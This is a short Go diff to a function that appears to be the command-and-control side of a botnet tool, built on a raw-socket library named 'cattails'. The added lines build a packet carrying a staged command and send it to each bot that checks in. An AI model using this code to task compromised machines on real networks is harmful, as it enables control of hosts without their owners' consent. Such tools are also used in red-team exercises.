@@ -26,7 +26,12 @@ func sendCommand(fd int, iface *net.Interface, src net.IP, listen chan Host) {
 	// Forever loop to respond to bots
 	for {
 		bot := <-listen
+
+		// Create packet
+		packet := cattails.CreatePacket(iface, src, bot.IP, bot.Mac, cattails.CreateCommand(stagedCmd))
 		fmt.Println("Repsonding to:", bot)
+		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+		fmt.Println("Sent reponse to:", bot)
 	}
 }
 
